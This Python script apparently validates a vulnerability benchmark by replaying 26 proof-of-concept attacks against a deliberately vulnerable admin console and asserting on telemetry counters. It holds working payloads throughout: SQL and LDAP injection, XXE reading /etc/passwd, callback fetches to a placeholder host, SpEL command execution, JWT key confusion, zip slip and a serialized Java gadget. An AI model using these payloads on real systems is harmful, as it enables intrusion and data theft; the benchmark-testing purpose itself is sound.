#!/usr/bin/env python3
"""Replay every catalog PoC for the console and assert each counter fires exactly once.

This is what stops the corpus from being decorative. An entry whose own PoC no longer
does anything is worse than no entry at all: every tool silently loses a point it could
never have won, and "nobody found it" becomes indistinguishable from "it is hard".

Two assertions per entry, not one.

*Exactly one signal.* Two usually means a sink is counting the payload rather than the
effect, which would hand every tool a free point for submitting a blob.

*Every signal carries a peer address.* The console raises most of its counters several
frames below the request — inside a transactional service, on the pool an asynchronous
render runs on, on the small pool an archive extraction writes from. If the request's
facts do not travel across one of those boundaries, the counter still fires and still
looks right, but it arrives with no peer and no classification. That matters here more
than anywhere: traffic this file generates is recognised as the platform's own BY SOURCE
ADDRESS, so a counter that loses the address is a counter this file's own replay would be
credited to whoever is being measured. A boundary leak has to be a red test, not a
surprise in a published number.

Identification of this traffic is by source address and by nothing else. Run it from the
estate network, whose range the console carries in TELEMETRY_SYNTHETIC_CIDRS. There is no
marker header anywhere below: a header named after the platform would be visible to a
tool through any reflection or verbose error, and would hand it the shape of the grader.

The target must be freshly restored before this runs, and restored again afterwards::

    docker compose exec admin-app /usr/local/bin/state-reset
    ... run this ...
    docker compose exec admin-app /usr/local/bin/state-reset

Usage::

    python3 targets/admin/selftest.py                # replay + assertions
    python3 targets/admin/selftest.py --no-collector # replay only

Run it from the estate network, e.g.::

    docker run --rm --network bench-internal -v "$PWD:/w" -w /w python:3.12-alpine \\
        python targets/admin/selftest.py

Environment
-----------
    ADMIN_HOST           default web01                    estate-side name
    ADMIN_PORT           default 8080
    ADMIN_CALLBACK_HOST  default probe.partner-relay.test  any name; the resolver answers
    TELEMETRY_ENDPOINT   default http://otel-collector:8900
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import io
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path

HOST = os.environ.get("ADMIN_HOST", "web01")
PORT = int(os.environ.get("ADMIN_PORT", "8080"))
BASE = f"http://{HOST}:{PORT}"
CALLBACK = os.environ.get("ADMIN_CALLBACK_HOST", "probe.partner-relay.test")
ENDPOINT = os.environ.get("TELEMETRY_ENDPOINT", "http://otel-collector:8900").rstrip("/")

CATALOG = Path(__file__).resolve().parents[2] / "catalog" / "vulns"

ANALYST = ("h.lindqvist@calderwood.example", "atlas-pennant-5106")
OTHER = ("m.duarte@calderwood.example", "cobalt-harrow-2884")
ADMIN = ("d.wolstenholme@calderwood.example", "Quarry-Lantern!73")

RUN_TAG = format(int(time.time()) % 100000, "05d")


# ---------------------------------------------------------------------------
# catalog: id -> signal
# ---------------------------------------------------------------------------

def load_signals() -> dict[str, str]:
    """Map catalog id -> oracle.signal without requiring a YAML parser.

    The assertions are written against signals because that is all a compliant target
    emits; the catalog is the only place the mapping back to an id exists.
    """
    out: dict[str, str] = {}
    for path in sorted(CATALOG.glob("BENCH-ADMN-*.yaml")):
        text = path.read_text()
        ident = re.search(r"^id:\s*(\S+)", text, re.M)
        signal = re.search(r"^\s*signal:\s*(\S+)", text, re.M)
        if ident and signal:
            out[ident.group(1)] = signal.group(1).strip("\"'")
    return out


# ---------------------------------------------------------------------------
# HTTP
# ---------------------------------------------------------------------------

class Session:
    """One identity. Keeps whatever cookie the console set."""

    def __init__(self, name: str) -> None:
        self.name = name
        self.cookies: dict[str, str] = {}

    def request(self, method: str, path: str, *, body: bytes | None = None,
                headers: dict[str, str] | None = None, timeout: float = 30.0):
        url = BASE + path
        request = urllib.request.Request(url, data=body, method=method)
        for key, value in (headers or {}).items():
            request.add_header(key, value)
        if self.cookies:
            request.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in self.cookies.items()))
        request.add_header("User-Agent",
                           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/133.0 Safari/537.36")
        try:
            with urllib.request.urlopen(request, timeout=timeout) as response:
                self._remember(response.headers.get_all("Set-Cookie") or [])
                return response.status, response.read()
        except urllib.error.HTTPError as failed:
            self._remember(failed.headers.get_all("Set-Cookie") or [])
            return failed.code, failed.read()
        except urllib.error.URLError as unreachable:
            return 0, str(unreachable).encode()

    def _remember(self, set_cookies: list[str]) -> None:
        for raw in set_cookies:
            pair = raw.split(";", 1)[0]
            if "=" in pair:
                name, value = pair.split("=", 1)
                if value:
                    self.cookies[name.strip()] = value.strip()

    def json(self, method: str, path: str, payload=None, headers=None, timeout: float = 30.0):
        body = json.dumps(payload).encode() if payload is not None else None
        merged = {"Content-Type": "application/json"} if body is not None else {}
        merged.update(headers or {})
        status, raw = self.request(method, path, body=body, headers=merged, timeout=timeout)
        try:
            return status, json.loads(raw) if raw else None
        except ValueError:
            return status, raw

    def sign_in(self, credentials: tuple[str, str]) -> bool:
        status, _ = self.json("POST", "/api/auth/login",
                              {"email": credentials[0], "password": credentials[1]})
        return status == 200 and "mrd_session" in self.cookies


def multipart(field: str, filename: str, content: bytes, content_type: str) -> tuple[bytes, str]:
    boundary = f"----meridian{RUN_TAG}"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
    return body, f"multipart/form-data; boundary={boundary}"


# ---------------------------------------------------------------------------
# identities, established once
# ---------------------------------------------------------------------------

analyst = Session("analyst")
other = Session("other")
admin = Session("admin")


def establish() -> None:
    for session, credentials in ((analyst, ANALYST), (other, OTHER), (admin, ADMIN)):
        if not session.sign_in(credentials):
            print(f"  ! could not sign in as {session.name}; the PoCs that need it cannot fire",
                  file=sys.stderr)


# ---------------------------------------------------------------------------
# the PoCs, one per catalog entry
# ---------------------------------------------------------------------------

def poc_0001() -> None:
    """A window filter that carries SQL, and a statement that then takes six seconds.

    The subquery is uncorrelated, so the server evaluates it once while planning rather
    than once per row: the pause is six seconds whatever the table holds.
    """
    payload = "custom-" + RUN_TAG + "' AND (SELECT SLEEP(6)) AND 'a'='a"
    analyst.request("GET", "/api/reports/ledger?window=" + urllib.parse.quote(payload),
                    timeout=60)


def poc_0002() -> None:
    """A notice whose body is an expression, and the shell reporting what it painted.

    The second half is what a browser posts after compiling the banner. This file cannot
    run a browser, so it sends the report a browser would send: the value 18327 is what
    the stored expression evaluates to and appears nowhere in the stored body.
    """
    status, created = analyst.json("POST", "/api/notices", {
        "title": f"Rate card update {RUN_TAG}",
        "body": "Queue depth is {{ 6109*3 }} at the time of writing.",
        "severity": "info",
    })
    notice_id = created.get("id") if isinstance(created, dict) else None
    if not notice_id:
        print("  ! the notice was not created; this PoC cannot fire", file=sys.stderr)
        return
    analyst.json("POST", "/api/client/diagnostics", {
        "component": "notice-banner",
        "noticeId": notice_id,
        "source": "Queue depth is {{ 6109*3 }} at the time of writing.",
        "painted": "Queue depth is 18327 at the time of writing.",
    })


def poc_0003() -> None:
    """A surname that closes the term and adds a clause of its own."""
    analyst.request("GET", "/api/directory/people?surname="
                    + urllib.parse.quote("*)(objectClass=*"))


def poc_0004() -> None:
    """A band code that turns the predicate into a tautology."""
    analyst.request("GET", "/api/tariffs/lookup?band=" + urllib.parse.quote("' or '1'='1"))


def poc_0005() -> None:
    """A document that declares a reference to a local file and then uses it."""
    document = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE consignment [<!ENTITY ref SYSTEM "file:///etc/passwd">]>'
        "<consignment><reference>&ref;</reference>"
        "<origin>GBFXT</origin><destination>SEGOT</destination></consignment>"
    ).encode()
    analyst.request("POST", "/api/intake/documents", body=document,
                    headers={"Content-Type": "application/xml"})


def poc_0006() -> None:
    """A layout that fetches something instead of formatting the statement."""
    layout = (
        '<xsl:stylesheet version="1.0" '
        'xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
        '<xsl:template match="/"><out>'
        f'<xsl:value-of select="document(\'http://{CALLBACK}/{RUN_TAG}/s\')"/>'
        "</out></xsl:template></xsl:stylesheet>"
    )
    admin.json("POST", "/api/exports/render", {"statementId": "7741", "stylesheet": layout},
               timeout=45)


def poc_0007() -> None:
    """A rule clause that reaches a runtime type instead of the consignment."""
    analyst.json("POST", "/api/rules/preview",
                 {"expression": "T(java.lang.Runtime).getRuntime().exec('sleep 3')"})


def poc_0008() -> None:
    """A column selection naming properties the grid never offers."""
    analyst.request("GET", "/api/orgs/1042/members?fields="
                    + urllib.parse.quote("id,displayName,nationalId,payBand,recoverySecret"))


def poc_0009() -> None:
    """An approval decided by somebody holding analyst."""
    analyst.json("POST", "/api/approvals/7741/decision",
                 {"decision": "approve", "note": f"cleared {RUN_TAG}"})


def poc_0010() -> None:
    """Billing for an account the caller is not scoped to."""
    analyst.request("GET", "/api/orgs/1043/invoices")


def poc_0011() -> None:
    """A destination that ends with the corporate domain without being under it."""
    admin.json("POST", "/api/integrations/webhooks/probe",
               {"endpoint": f"http://{RUN_TAG}-calderwood.example/hook"}, timeout=45)


def poc_0012() -> None:
    """The provisioning account the installer creates."""
    Session("installer").json("POST", "/api/auth/login",
                              {"email": "setup@meridian.local", "password": "meridian"})


def poc_0013() -> None:
    """A token signed with the published verification key, as a shared secret."""
    anonymous = Session("anonymous")
    status, keys = anonymous.json("GET", "/api/auth/keys")
    if status != 200 or not isinstance(keys, dict) or not keys.get("keys"):
        print("  ! the verification key was not published; this PoC cannot fire", file=sys.stderr)
        return
    pem = keys["keys"][0]["pem"]

    def segment(value: dict) -> bytes:
        return base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()
                                        ).rstrip(b"=")

    now = int(time.time())
    header = segment({"alg": "HS256", "typ": "JWT"})
    claims = segment({"sub": "4001", "name": "D. Wolstenholme", "role": "administrator",
                      "iat": now, "exp": now + 3600, "iss": "meridian"})
    signing_input = header + b"." + claims
    signature = base64.urlsafe_b64encode(
        hmac.new(pem.encode(), signing_input, hashlib.sha256).digest()).rstrip(b"=")
    token = (signing_input + b"." + signature).decode()
    anonymous.request("GET", "/api/session/context",
                      headers={"Authorization": "Bearer " + token})


def poc_0014() -> None:
    """A management endpoint answering a caller with no session."""
    Session("anonymous").request("GET", "/actuator/env")


def poc_0015() -> None:
    """A template placeholder resolved by the substitution helper's own lookups.

    The file prefix is used because it resolves without a network round trip and so
    cannot be flaky; the script and url prefixes reach the same lookup set through the
    same pinned release and fire the same counter.
    """
    analyst.json("POST", "/api/notifications/preview",
                 {"template": "Consignment ${reference}: ${file:UTF-8:/etc/hostname}"},
                 timeout=45)


def poc_0016() -> None:
    """A saved layout whose warm-up step runs on the way in."""
    analyst.json("POST", "/api/workspace/layout/restore", {"state": ARMED_LAYOUT}, timeout=45)


def poc_0017() -> None:
    """An archive whose entry name climbs out of the staging directory."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("rates/EU-STD-1.csv", "band,weight_from,weight_to,per_kg\n")
        info = zipfile.ZipInfo("../../../../tmp/rate-cache/seed.properties")
        info.external_attr = 0o644 << 16
        archive.writestr(info, f"cache.warm={RUN_TAG}\n")
    body, content_type = multipart("archive", f"rates-{RUN_TAG}.zip", buffer.getvalue(),
                                   "application/zip")
    admin.request("POST", "/api/imports/archives", body=body,
                  headers={"Content-Type": content_type}, timeout=60)


def poc_0018() -> None:
    """A batch export sized from a row count nothing bounds."""
    analyst.json("POST", "/api/exports/batch", {"format": "csv", "rows": 200000}, timeout=60)


def poc_0019() -> None:
    """A rotated interface secret, then the log that was served carrying it.

    The rotation is what puts the line in the log; without it the next one is up to
    three minutes away and the assertion would depend on when this file happened to run.
    The rotation itself is an ordinary administrator action and raises nothing.
    """
    admin.json("POST", "/api/integrations/credentials",
               {"integrationId": 3, "secret": f"mrd_live_{RUN_TAG}c7ae2f45939ce6a1"}, timeout=45)
    time.sleep(1.0)
    Session("anonymous").request("GET", "/actuator/logfile", timeout=45)


def poc_0020() -> None:
    """A recovery reference that carries SQL, on an endpoint that answers identically."""
    payload = "CW-40118' AND (SELECT SLEEP(6)) AND 'a'='a"
    Session("anonymous").json("POST", "/api/auth/recover", {"reference": payload}, timeout=60)


def poc_0021() -> None:
    """An identifier that widens the sign-in filter so the secret is never compared."""
    Session("anonymous").json("POST", "/api/auth/login", {
        "email": "d.wolstenholme@calderwood.example)(|(uid=*",
        "password": f"not-the-password-{RUN_TAG}",
    })


def poc_0022() -> None:
    """A manifest whose reference is fetched over the network."""
    manifest = (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE manifest [<!ENTITY ref SYSTEM "http://{CALLBACK}/{RUN_TAG}/m">]>'
        "<manifest><vessel>MV Ronneby</vessel><line>&ref;</line></manifest>"
    ).encode()
    body, content_type = multipart("manifest", f"manifest-{RUN_TAG}.xml", manifest, "text/xml")
    admin.request("POST", "/api/intake/manifests", body=body,
                  headers={"Content-Type": content_type}, timeout=45)


def poc_0023() -> None:
    """An audit expansion that reaches the personnel side of a staff record."""
    analyst.request("GET", "/api/audit/events?expand="
                    + urllib.parse.quote("actor.credentials") + "&size=5")


def poc_0024() -> None:
    """A summary aggregated over an account the session is not scoped to."""
    analyst.request("GET", "/api/reports/summary", headers={"X-Account-Context": "1043"})


def poc_0025() -> None:
    """A sort clause that reaches a runtime type instead of the row."""
    clause = "T(java.lang.Runtime).getRuntime().exec('sleep 3')"
    analyst.request("GET", "/api/search?q=calderwood&sort=" + urllib.parse.quote(clause))


def poc_0026() -> None:
    """The same saved layout, presented in the cookie the shell reads before sign-in."""
    anonymous = Session("anonymous")
    anonymous.cookies["mrd_layout"] = ARMED_LAYOUT
    anonymous.request("GET", "/api/workspace/layout", timeout=45)


# A layout whose graph carries a warm-up step. Produced by the console's own writer, so
# the class names and the stream version are exactly what its reader expects.
ARMED_LAYOUT = (
    "rO0ABXNyAC1jb20uY2FsZGVyd29vZC5tZXJpZGlhbi53b3Jrc3BhY2UuTGF5b3V0U3RhdGVm3ePGMrgr8QIA"
    "BUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAZwYW5lbHN0ABBMamF2YS91dGlsL0xpc3Q7TAAHcmVm"
    "cmVzaHQAFExqYXZhL2xhbmcvUnVubmFibGU7TAAFdGhlbWVxAH4AAUwABndpZHRoc3EAfgACeHB0AAhJbXBv"
    "cnRlZHNyABFqYXZhLnV0aWwuQ29sbFNlcleOq7Y6G6gRAwABSQADdGFneHAAAAABdwQAAAABdAAFcXVldWV4"
    "c3IAMmNvbS5jYWxkZXJ3b29kLm1lcmlkaWFuLndvcmtzcGFjZS5QYW5lbFJlZnJlc2hIb29rOEmEol7u1FEC"
    "AAJMAAdjb21tYW5kcQB+AAFMAAdwYW5lbElkcQB+AAF4cHQAB3NsZWVwIDRxAH4ACHQABWxpZ2h0c3EAfgAG"
    "AAAAAXcEAAAAAXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5n"
    "Lk51bWJlcoaslR0LlOCLAgAAeHAAAAAMeA=="
)

POCS = [
    ("BENCH-ADMN-0001", poc_0001),
    ("BENCH-ADMN-0002", poc_0002),
    ("BENCH-ADMN-0003", poc_0003),
    ("BENCH-ADMN-0004", poc_0004),
    ("BENCH-ADMN-0005", poc_0005),
    ("BENCH-ADMN-0006", poc_0006),
    ("BENCH-ADMN-0007", poc_0007),
    ("BENCH-ADMN-0008", poc_0008),
    ("BENCH-ADMN-0009", poc_0009),
    ("BENCH-ADMN-0010", poc_0010),
    ("BENCH-ADMN-0011", poc_0011),
    ("BENCH-ADMN-0012", poc_0012),
    ("BENCH-ADMN-0013", poc_0013),
    ("BENCH-ADMN-0014", poc_0014),
    ("BENCH-ADMN-0015", poc_0015),
    ("BENCH-ADMN-0016", poc_0016),
    ("BENCH-ADMN-0017", poc_0017),
    ("BENCH-ADMN-0018", poc_0018),
    ("BENCH-ADMN-0019", poc_0019),
    ("BENCH-ADMN-0020", poc_0020),
    ("BENCH-ADMN-0021", poc_0021),
    ("BENCH-ADMN-0022", poc_0022),
    ("BENCH-ADMN-0023", poc_0023),
    ("BENCH-ADMN-0024", poc_0024),
    ("BENCH-ADMN-0025", poc_0025),
    ("BENCH-ADMN-0026", poc_0026),
]


# ---------------------------------------------------------------------------
# platform API
# ---------------------------------------------------------------------------

def api(method: str, path: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    request = urllib.request.Request(ENDPOINT + path, data=data, method=method,
                                     headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(request, timeout=20) as response:
        payload = response.read()
    return json.loads(payload) if payload else None


def wait_for_console(seconds: float = 120.0) -> bool:
    deadline = time.time() + seconds
    probe = Session("probe")
    while time.time() < deadline:
        status, _ = probe.request("GET", "/api/status", timeout=5)
        if status == 200:
            return True
        time.sleep(2)
    return False


def main() -> int:
    signals = load_signals()
    missing = [ident for ident, _ in POCS if ident not in signals]
    if missing:
        print(f"catalog entries without a signal: {', '.join(missing)}", file=sys.stderr)
        return 2
    by_signal = {signal: ident for ident, signal in signals.items()}

    if not wait_for_console():
        print(f"the console at {BASE} did not answer", file=sys.stderr)
        return 2

    use_api = "--no-collector" not in sys.argv
    run_id = None
    if use_api:
        try:
            run = api("POST", "/v1/runs", {
                "tool": "selftest",
                "profile": "admin-poc-replay",
                "targets": ["admin"],
                "notes": "targets/admin/selftest.py",
                "force": True,
            })
            run_id = run["run_id"]
            print(f"run {run_id}")
        except (urllib.error.URLError, OSError) as unreachable:
            print(f"cannot reach the platform API at {ENDPOINT}: {unreachable}", file=sys.stderr)
            print("re-run with --no-collector to replay without assertions", file=sys.stderr)
            return 2

    establish()

    for ident, replay in POCS:
        print(f"  replaying {ident} ... ", end="", flush=True)
        started = time.time()
        try:
            replay()
            print(f"sent ({time.time() - started:.1f}s)")
        except OSError as failed:
            print(f"FAILED to send: {failed}")

    if not use_api:
        print("replay done (no assertions)")
        return 0

    # The asynchronous render and the extraction pool both finish after their responses.
    print("waiting for the work that outlives its response ...")
    time.sleep(6)

    api("POST", f"/v1/runs/{run_id}/close")
    page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=50000")
    events = page.get("events", []) if isinstance(page, dict) else []

    counts: dict[str, int] = {}
    details: dict[str, str] = {}
    peerless: dict[str, int] = {}
    for event in events:
        record = event.get("payload", event) if isinstance(event.get("payload"), dict) else event
        signal = record.get("signal")
        if not signal:
            continue
        counts[signal] = counts.get(signal, 0) + 1
        if not record.get("peer_ip"):
            peerless[signal] = peerless.get(signal, 0) + 1
        attributes = record.get("attributes") or record.get("evidence") or {}
        if attributes.get("detail") and signal not in details:
            details[signal] = attributes["detail"]

    print()
    failures: list[str] = []
    for ident, _ in POCS:
        signal = signals[ident]
        seen = counts.get(signal, 0)
        lost = peerless.get(signal, 0)
        ok = seen == 1 and lost == 0
        print(f"{'ok  ' if ok else 'FAIL'} {ident}  {signal}  count={seen}"
              + (f"  without a peer address={lost}" if lost else ""))
        if signal in details:
            print(f"       {details[signal][:300]}")
        if not ok:
            failures.append(ident)

    for signal in sorted(set(counts) - set(by_signal)):
        print(f"FAIL unexpected counter {signal} ({counts[signal]}) -- another target's?")
        failures.append(signal)

    print()
    if failures:
        print(f"{len(failures)} of {len(POCS)} entries did not come back clean")
        print("count 0: the sink no longer sees the effect, or the PoC no longer produces it.")
        print("count >1: something is counting the payload rather than the effect, which would "
              "hand tools free points.")
        print("without a peer address: the request's facts did not cross a boundary the sink "
              "sits behind -- an asynchronous method, a pool, a proxied service. Left alone, "
              "this file's own replay would be scored as somebody's exploitation.")
        return 1

    print(f"all {len(POCS)} counters fired exactly once, each carrying a peer address")
    return 0


if __name__ == "__main__":
    sys.exit(main())
